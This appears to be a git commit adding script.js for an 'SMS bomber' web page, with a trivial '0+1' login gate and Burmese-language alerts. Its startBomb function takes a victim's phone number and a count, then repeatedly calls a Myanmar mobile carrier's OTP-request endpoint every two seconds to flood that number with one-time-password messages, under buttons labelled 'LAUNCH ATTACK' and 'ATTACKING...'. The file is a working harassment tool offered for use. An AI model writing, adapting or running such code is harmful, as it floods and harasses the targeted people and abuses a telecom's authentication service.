f20e4e0b145d9761581c8e110bd3946abf2bf65c
julym0982-hub <julym0982@gmail.com>
2026-02-04 20:05:16 +0630

    Add files via upload

---
+++ script.js
@@ -0,0 +1,46 @@
+function checkMath() {
+    const val = document.getElementById('answerInput').value;
+    
+    if (val === "1") {
+        document.getElementById('loginBox').style.display = 'none';
+        document.getElementById('controlPanel').style.display = 'block';
+    } else {
+        alert("အဖြေမှားနေပါတယ်! 0+1 က 1 ပါဗျ။");
+        document.getElementById('answerInput').value = ""; 
+    }
+}
+
+async function startBomb() {
+    let p = document.getElementById('phone').value;
+    let c = parseInt(document.getElementById('smsCount').value);
+
+    if(!p || !c) { alert("အချက်အလက် အကုန်ဖြည့်ပါ!"); return; }
+    if(p.startsWith('09')) { p = '95' + p.substring(1); }
+
+    const btn = document.getElementById('startBtn');
+    btn.disabled = true;
+    btn.innerText = "ATTACKING...";
+    
+    document.getElementById('pContainer').style.display = 'block';
+    document.getElementById('counterArea').style.display = 'flex';
+
+    for(let i = 1; i <= c; i++) {
+        document.getElementById('sentVal').innerText = i;
+        document.getElementById('leftVal').innerText = c - i;
+        
+        let percent = (i / c) * 100;
+        document.getElementById('pBar').style.width = percent + "%";
+
+        try {
+            await fetch(`https://apis.mytel.com.mm/myid/authen/v1.0/login/method/otp/get-otp?phoneNumber=${p}`, {
+                mode: 'no-cors'
+            });
+        } catch(e) {}
+
+        await new Promise(r => setTimeout(r, 2000));
+    }
+    
+    alert("Attack Completed!");
+    btn.disabled = false;
+    btn.innerText = "LAUNCH ATTACK";
+}
